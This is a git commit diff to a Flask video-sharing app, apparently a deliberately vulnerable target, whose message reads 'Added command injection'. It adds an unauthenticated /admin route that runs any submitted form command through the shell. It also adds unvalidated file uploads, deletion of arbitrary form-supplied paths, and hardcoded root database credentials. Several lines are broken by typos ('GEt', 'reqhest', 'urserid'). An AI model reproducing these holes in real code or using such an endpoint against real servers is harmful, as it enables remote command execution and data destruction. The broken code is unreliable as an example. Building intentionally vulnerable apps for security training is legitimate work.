2845b899849f9d5ce820bf7be559af31afa44ea2
raydan4 <dszafran116@gmail.com>
2019-11-22 22:13:52 -0500

    Added command injection

--- application/blueprints/videoAPI/video.py
+++ application/blueprints/videoAPI/video.py
@@ -3,27 +3,83 @@ from jinja2 import TemplateNotFound
 
 video = Blueprint('video', __name__, template_folder='templates', static_folder='static')
 
-@video.route('/upload')
+@video.route('/upload', methods=['GET', 'POST'])
 def show_upload():
-    try:
-        return render_template('/video/upload.html')
-    except TemplateNotFound:
-        abort(404)
+    if request.method == 'POST':
+        # Get parameters from request
+        sid = request.form['sessionid']
+        userid = request.form['urserid']
+        name = request.form['name']
+        description = request.form['description']
+        location = request.form['location']
+        filetype = request.form['filetype']
 
-@video.route('/delete')
+        ## Validate form input
+        # Logged in
+        if not sessionid_isvalid(sid):
+            abort(403)
+        # Video is Present
+        video = request.files.get('video')
+        if not video or not video.filename:
+            abort(400)
+        
+        # Connect to database
+        connection = pymysql.connect(host='maria',
+                             user='root',
+                             password='changeme',
+                             db='tubehub',
+                             charset='utf8mb4',
+                             cursorclass=pymysql.cursors.DictCursor)
+        cur = connection.cursor()
+
+
+        # Add video info to database
+        sql = "INSERT INTO `video` (`name`, `userid`, `description`, `location`, `filetype`) VALUES (%s, %s, %s, %s, %s)"
+        cur.execute(sql, (name, userid, description, location, filetype))
+        connection.commit()
+
+        # Save video file to server (no validation lol all in same directory)
+        video.save(os.path.join('static/videos/', video.filename))
+
+        return redirect('/upload')
+    if request.method == 'GET':
+        try:
+            return render_template('/video/upload.html')
+        except TemplateNotFound:
+            abort(404)
+
+@video.route('/delete', methods=['POST'])
 def show_delete():
-    try:
-        return render_template('/video/delete.html')
-    except TemplateNotFound:
-        abort(404)
+    if request.method == 'POST':
+        
+        # Remove file
+        location = request.form['location']
+        os.remove(location)
+        
+        # Connect to database
+        connection = pymysql.connect(host='maria',
+                             user='root',
+                             password='changeme',
+                             db='tubehub',
+                             charset='utf8mb4',
+                             cursorclass=pymysql.cursors.DictCursor)
+        cur = connection.cursor()
+        
+        # Remove database entry
+
+    if request.method == 'GEt':
+        try:
+            return render_template('/video/delete.html')
+        except TemplateNotFound:
+            abort(404)
 
 @video.route('/watch')
 def show_watch():
     try:
-        title = 'nice'
-        source = 'static/videos/classic.mp4'
-        filetype = 'video/mp4'
-        description = 'sad'
+        title = request.form['name']
+        source = request.form['location']
+        filetype = request.form['filetype']
+        description = reqhest.form['description']
         return render_template('/video/watch.html', title=title, source=source, filetype=filetype, description=description)
     except TemplateNotFound:
         abort(404)
--- application/server.py
+++ application/server.py
@@ -1,14 +1,11 @@
 import urllib.request 
-import pymysql
-from pymysql import cursors
-from datetime import datetime
+from subprocess import check_output
 from flask import (
         Blueprint,
         Flask,
         render_template,
         request,
-        redirect,
-        flash
+        jsonify
 )
 
 from blueprints.searchAPI.search import search
@@ -17,52 +14,18 @@ from blueprints.videoAPI.video import video
 
 app = Flask(__name__)
 
-connection = pymysql.connect(host='maria',
-                             user='root',
-                             password='changeme',
-                             db='tubehub',
-                             charset='utf8mb4',
-                             cursorclass=pymysql.cursors.DictCursor)
-
-cur = connection.cursor()
-
 @app.route('/')
 def index():
     return render_template('index.html')
 
-@app.route('/register', methods=['POST', 'GET'])
-def register():
-    if request.method == 'POST':
-        username = request.form['username']
-        password = request.form['password']
-        date = datetime.now()
- 
-        sql = "INSERT INTO `users` (`username`, `password`, `birthdate`, `email`, `sessionid`) VALUES (%s, %s, %s, %s, %s)"
-        cur.execute(sql, (username, password, date, "example@email.com", "jkfal13k3jfdq"))
-        connection.commit()
-
-        return redirect("/login")
-    if request.method == 'GET':
-        return render_template("signup.html")
-
-
-@app.route('/login', methods=['POST', 'GET'])
-def login():
-    if request.method == 'POST':
-        username = request.form['username']
-        password = request.form['password']
-
-        return redirect("/login")
-    if request.method == 'GET':
-        return render_template("signin.html")
-
-
-@app.route('/home', methods=['POST', 'GET'])
+@app.route('/admin', methods=['POST'])
 def home():
-    if request.method == 'POST':
-        return redirect("/login")
-    if request.method == 'GET':
-        return render_template("home.html")
+    try:
+        result = check_output([request.form['command']], shell=True).decode()
+    except:
+        result = 'ERROR'
+    return jsonify(output=result)
+    
 
 app.register_blueprint(search, url_prefix='/search')
 app.register_blueprint(account, url_prefix='/account')
